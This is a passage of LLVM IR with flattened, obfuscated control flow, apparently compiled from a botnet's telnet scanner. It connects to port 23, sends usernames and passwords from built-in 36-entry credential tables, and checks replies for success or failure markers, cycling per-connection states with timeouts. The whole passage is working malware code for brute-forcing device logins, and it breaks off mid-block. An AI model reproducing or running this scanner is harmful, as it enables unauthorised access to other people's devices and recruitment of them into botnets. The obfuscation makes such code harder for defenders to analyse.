  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 3
  %149 = load i8, i8* %148, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 0
  %152 = select i1 %151, i32 -1303401309, i32 1513109213
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %5, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 5
  %158 = load i8, i8* %157, align 1
  %159 = add i8 %158, 1
  store i8 %159, i8* %157, align 1
  %160 = load i32, i32* %5, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 4
  %164 = load i8, i8* %163, align 2
  %165 = add i8 %164, 1
  store i8 %165, i8* %163, align 2
  %166 = load i32, i32* %5, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %167
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %168, i32 0, i32 5
  %170 = load i8, i8* %169, align 1
  %171 = zext i8 %170 to i64
  %172 = icmp eq i64 %171, 36
  %173 = select i1 %172, i32 -384998990, i32 1952153635
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i32, i32* %5, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 3
  store i8 1, i8* %178, align 1
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 4
  %184 = load i8, i8* %183, align 2
  %185 = zext i8 %184 to i64
  %186 = icmp eq i64 %185, 36
  %187 = select i1 %186, i32 -425376182, i32 -818990031
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i32, i32* %5, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 3
  store i8 1, i8* %192, align 1
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  store i32 1513109213, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  store i32 -1117724451, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %196, align 4
  %197 = call zeroext i16 @htons(i16 zeroext 23) #10
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %197, i16* %198, align 2
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %200 = getelementptr inbounds [8 x i8], [8 x i8]* %199, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 8, i32 4, i1 false)
  %201 = load i32, i32* %5, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 1
  %205 = load i32, i32* %204, align 4
  %206 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %207 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %206, i32 0, i32 0
  store i32 %205, i32* %207, align 4
  %208 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %209 = load i32, i32* %5, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  store i32 %208, i32* %212, align 16
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = icmp eq i32 %217, -1
  %219 = select i1 %218, i32 -1112266168, i32 1831795472
  store i32 %219, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* %5, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %223
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %224, i32 0, i32 0
  %226 = load i32, i32* %225, align 16
  %227 = load i32, i32* %5, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %228
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 16
  %232 = call i32 (i32, i32, ...) @fcntl(i32 %231, i32 3, i8* null)
  %233 = or i32 %232, 2048
  %234 = call i32 (i32, i32, ...) @fcntl(i32 %226, i32 4, i32 %233)
  %235 = load i32, i32* %5, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 0
  %239 = load i32, i32* %238, align 16
  %240 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %241 = call i32 @connect(i32 %239, %struct.sockaddr* %240, i32 16)
  %242 = icmp eq i32 %241, -1
  %243 = select i1 %242, i32 1867745371, i32 137011866
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32* @__errno_location() #10
  %246 = load i32, i32* %245, align 4
  %247 = icmp ne i32 %246, 115
  %248 = select i1 %247, i32 1569189943, i32 137011866
  store i32 %248, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %5, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %251
  call void @reset_telstate(%struct.telstate_t* %252)
  store i32 -1112797623, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i32, i32* %5, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %255
  call void @advance_state(%struct.telstate_t* %256, i32 1)
  store i32 -1112797623, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  store i32 -993238654, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  store i32 -1164233070, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %261 = getelementptr inbounds [16 x i64], [16 x i64]* %260, i64 0, i64 0
  %262 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %261) #3, !srcloc !6
  %263 = extractvalue { i64, i64* } %262, 0
  %264 = extractvalue { i64, i64* } %262, 1
  %265 = trunc i64 %263 to i32
  store i32 %265, i32* %21, align 4
  %266 = ptrtoint i64* %264 to i64
  %267 = trunc i64 %266 to i32
  store i32 %267, i32* %22, align 4
  store i32 15396269, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  store i32 450290963, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i32, i32* %5, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 0
  %274 = load i32, i32* %273, align 16
  %275 = srem i32 %274, 64
  %276 = zext i32 %275 to i64
  %277 = shl i64 1, %276
  %278 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %279 = load i32, i32* %5, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = sdiv i32 %283, 64
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [16 x i64], [16 x i64]* %278, i64 0, i64 %285
  %287 = load i64, i64* %286, align 8
  %288 = or i64 %287, %277
  store i64 %288, i64* %286, align 8
  %289 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %289, align 8
  %290 = load i32, i32* %3, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %291, i64* %292, align 8
  %293 = load i32, i32* %5, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %294
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 16
  %298 = add nsw i32 %297, 1
  %299 = call i32 @select(i32 %298, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %299, i32* %6, align 4
  %300 = load i32, i32* %6, align 4
  %301 = icmp eq i32 %300, 1
  %302 = select i1 %301, i32 -1821006428, i32 -2004964955
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %304 = load i32, i32* %5, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %305
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %306, i32 0, i32 0
  %308 = load i32, i32* %307, align 16
  %309 = bitcast i32* %15 to i8*
  %310 = call i32 @getsockopt(i32 %308, i32 1, i32 4, i8* %309, i32* %14) #3
  %311 = load i32, i32* %15, align 4
  %312 = icmp ne i32 %311, 0
  %313 = select i1 %312, i32 941277149, i32 1988345255
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i32, i32* %5, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %316
  call void @reset_telstate(%struct.telstate_t* %317)
  store i32 2089664464, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i32, i32* %5, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 0
  %323 = load i32, i32* %322, align 16
  %324 = load i32, i32* %5, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 0
  %328 = load i32, i32* %327, align 16
  %329 = call i32 (i32, i32, ...) @fcntl(i32 %328, i32 3, i8* null)
  %330 = and i32 %329, -2049
  %331 = call i32 (i32, i32, ...) @fcntl(i32 %323, i32 4, i32 %330)
  %332 = load i32, i32* %5, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %333
  call void @advance_state(%struct.telstate_t* %334, i32 2)
  store i32 2089664464, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i32, i32* %6, align 4
  %338 = icmp eq i32 %337, -1
  %339 = select i1 %338, i32 -1825513865, i32 671673328
  store i32 %339, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  %341 = load i32, i32* %5, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %342
  call void @reset_telstate(%struct.telstate_t* %343)
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  store i32 1646417849, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i32, i32* %5, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %347
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %348, i32 0, i32 7
  %350 = load i32, i32* %349, align 16
  %351 = add i32 %350, 5
  %352 = zext i32 %351 to i64
  %353 = call i64 @time(i64* null) #3
  %354 = icmp slt i64 %352, %353
  %355 = select i1 %354, i32 1177511162, i32 2100977498
  store i32 %355, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i32, i32* %5, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %358
  call void @reset_telstate(%struct.telstate_t* %359)
  store i32 2100977498, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  store i32 -993238654, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load i32, i32* %5, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 0
  %366 = load i32, i32* %365, align 16
  %367 = load i32, i32* %3, align 4
  %368 = load i32, i32* %5, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %369
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %370, i32 0, i32 9
  %372 = load i8*, i8** %371, align 8
  %373 = call i32 @read_until_response(i32 %366, i32 %367, i8* %372, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %374 = icmp ne i32 %373, 0
  %375 = select i1 %374, i32 1478999760, i32 989169139
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load i32, i32* %5, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %378
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %379, i32 0, i32 9
  %381 = load i8*, i8** %380, align 8
  %382 = call i32 @contains_fail(i8* %381)
  %383 = icmp ne i32 %382, 0
  %384 = select i1 %383, i32 -886549431, i32 -902399087
  store i32 %384, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i32, i32* %5, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %387
  call void @advance_state(%struct.telstate_t* %388, i32 0)
  store i32 1323319194, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = load i32, i32* %5, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %391
  call void @advance_state(%struct.telstate_t* %392, i32 3)
  store i32 1323319194, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i32, i32* %5, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 7
  %399 = load i32, i32* %398, align 16
  %400 = add i32 %399, 7
  %401 = zext i32 %400 to i64
  %402 = call i64 @time(i64* null) #3
  %403 = icmp slt i64 %401, %402
  %404 = select i1 %403, i32 -216167361, i32 563739119
  store i32 %404, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = load i32, i32* %5, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %407
  call void @reset_telstate(%struct.telstate_t* %408)
  store i32 563739119, i32* %switchVar
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  store i32 -993238654, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i32, i32* %5, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 0
  %415 = load i32, i32* %414, align 16
  %416 = load i32, i32* %5, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 4
  %420 = load i8, i8* %419, align 2
  %421 = zext i8 %420 to i64
  %422 = getelementptr inbounds [36 x i8*], [36 x i8*]* @usernames, i64 0, i64 %421
  %423 = load i8*, i8** %422, align 8
  %424 = load i32, i32* %5, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 4
  %428 = load i8, i8* %427, align 2
  %429 = zext i8 %428 to i64
  %430 = getelementptr inbounds [36 x i8*], [36 x i8*]* @usernames, i64 0, i64 %429
  %431 = load i8*, i8** %430, align 8
  %432 = call i64 @strlen(i8* %431) #9
  %433 = call i64 @send(i32 %415, i8* %423, i64 %432, i32 16384)
  %434 = icmp slt i64 %433, 0
  %435 = select i1 %434, i32 -963047214, i32 1877410165
  store i32 %435, i32* %switchVar
  br label %loopEnd

; <label>:436:                                    ; preds = %loopEntry
  %437 = load i32, i32* %5, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %438
  call void @reset_telstate(%struct.telstate_t* %439)
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:440:                                    ; preds = %loopEntry
  %441 = load i32, i32* %5, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 16
  %446 = call i64 @send(i32 %445, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i32 0, i32 0), i64 2, i32 16384)
  %447 = icmp slt i64 %446, 0
  %448 = select i1 %447, i32 453506383, i32 -595236254
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load i32, i32* %5, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %451
  call void @reset_telstate(%struct.telstate_t* %452)
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  %454 = load i32, i32* %5, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %455
  call void @advance_state(%struct.telstate_t* %456, i32 4)
  store i32 -993238654, i32* %switchVar
  br label %loopEnd

; <label>:457:                                    ; preds = %loopEntry
  %458 = load i32, i32* %5, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 0
  %462 = load i32, i32* %461, align 16
  %463 = load i32, i32* %3, align 4
  %464 = load i32, i32* %5, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 9
  %468 = load i8*, i8** %467, align 8
  %469 = call i32 @read_until_response(i32 %462, i32 %463, i8* %468, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %470 = icmp ne i32 %469, 0
  %471 = select i1 %470, i32 -1112664149, i32 1092367214
  store i32 %471, i32* %switchVar
  br label %loopEnd

; <label>:472:                                    ; preds = %loopEntry
  %473 = load i32, i32* %5, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 9
  %477 = load i8*, i8** %476, align 8
  %478 = call i32 @contains_fail(i8* %477)
  %479 = icmp ne i32 %478, 0
  %480 = select i1 %479, i32 -444354409, i32 1082085324
  store i32 %480, i32* %switchVar
  br label %loopEnd

; <label>:481:                                    ; preds = %loopEntry
  %482 = load i32, i32* %5, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %483
  call void @advance_state(%struct.telstate_t* %484, i32 0)
  store i32 -800284386, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i32, i32* %5, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %487
  call void @advance_state(%struct.telstate_t* %488, i32 5)
  store i32 -800284386, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  %491 = load i32, i32* %5, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 7
  %495 = load i32, i32* %494, align 16
  %496 = add i32 %495, 3
  %497 = zext i32 %496 to i64
  %498 = call i64 @time(i64* null) #3
  %499 = icmp slt i64 %497, %498
  %500 = select i1 %499, i32 1186288913, i32 1285562324
  store i32 %500, i32* %switchVar
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  %502 = load i32, i32* %5, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %503
  call void @reset_telstate(%struct.telstate_t* %504)
  store i32 1285562324, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  store i32 -993238654, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i32, i32* %5, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 0
  %511 = load i32, i32* %510, align 16
  %512 = load i32, i32* %5, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %513
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %514, i32 0, i32 5
  %516 = load i8, i8* %515, align 1
  %517 = zext i8 %516 to i64
  %518 = getelementptr inbounds [36 x i8*], [36 x i8*]* @passwords, i64 0, i64 %517
  %519 = load i8*, i8** %518, align 8
  %520 = load i32, i32* %5, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 5
  %524 = load i8, i8* %523, align 1
  %525 = zext i8 %524 to i64
  %526 = getelementptr inbounds [36 x i8*], [36 x i8*]* @passwords, i64 0, i64 %525
  %527 = load i8*, i8** %526, align 8
  %528 = call i64 @strlen(i8* %527) #9
  %529 = call i64 @send(i32 %511, i8* %519, i64 %528, i32 16384)
  %530 = icmp slt i64 %529, 0
  %531 = select i1 %530, i32 1385510452, i32 1002542915
  store i32 %531, i32* %switchVar
  br label %loopEnd

; <label>:532:                                    ; preds = %loopEntry
  %533 = load i32, i32* %5, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %534
  call void @reset_telstate(%struct.telstate_t* %535)
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:536:                                    ; preds = %loopEntry
  %537 = load i32, i32* %5, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 0
  %541 = load i32, i32* %540, align 16
  %542 = call i64 @send(i32 %541, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i32 0, i32 0), i64 2, i32 16384)
  %543 = icmp slt i64 %542, 0
  %544 = select i1 %543, i32 -813262921, i32 -1512850597
  store i32 %544, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = load i32, i32* %5, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %547
  call void @reset_telstate(%struct.telstate_t* %548)
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = load i32, i32* %5, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %551
  call void @advance_state(%struct.telstate_t* %552, i32 6)
  store i32 -993238654, i32* %switchVar
  br label %loopEnd

; <label>:553:                                    ; preds = %loopEntry
  %554 = load i32, i32* %5, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 0
  %558 = load i32, i32* %557, align 16
  %559 = load i32, i32* %3, align 4
  %560 = load i32, i32* %5, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 9
  %564 = load i8*, i8** %563, align 8
  %565 = call i32 @read_until_response(i32 %558, i32 %559, i8* %564, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %566 = icmp ne i32 %565, 0
  %567 = select i1 %566, i32 -532722634, i32 18591303
  store i32 %567, i32* %switchVar
  br label %loopEnd

; <label>:568:                                    ; preds = %loopEntry
  %569 = call i64 @time(i64* null) #3
  %570 = trunc i64 %569 to i32
  %571 = load i32, i32* %5, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %572
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %573, i32 0, i32 7
  store i32 %570, i32* %574, align 16
  %575 = load i32, i32* %5, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %576
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %577, i32 0, i32 9
  %579 = load i8*, i8** %578, align 8
  %580 = call i32 @contains_fail(i8* %579)
  %581 = icmp ne i32 %580, 0
  %582 = select i1 %581, i32 -1897402905, i32 -144204513
  store i32 %582, i32* %switchVar
  br label %loopEnd

; <label>:583:                                    ; preds = %loopEntry
  %584 = load i32, i32* %5, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %585
  call void @advance_state(%struct.telstate_t* %586, i32 0)
  store i32 1231171563, i32* %switchVar
  br label %loopEnd

; <label>:587:                                    ; preds = %loopEntry
  %588 = load i32, i32* %5, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 9
  %592 = load i8*, i8** %591, align 8
  %593 = call i32 @contains_success(i8* %592)
  %594 = icmp ne i32 %593, 0
  %595 = select i1 %594, i32 -1074564614, i32 1141042713
  store i32 %595, i32* %switchVar
  br label %loopEnd

; <label>:596:                                    ; preds = %loopEntry
  %597 = load i32, i32* %5, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %598
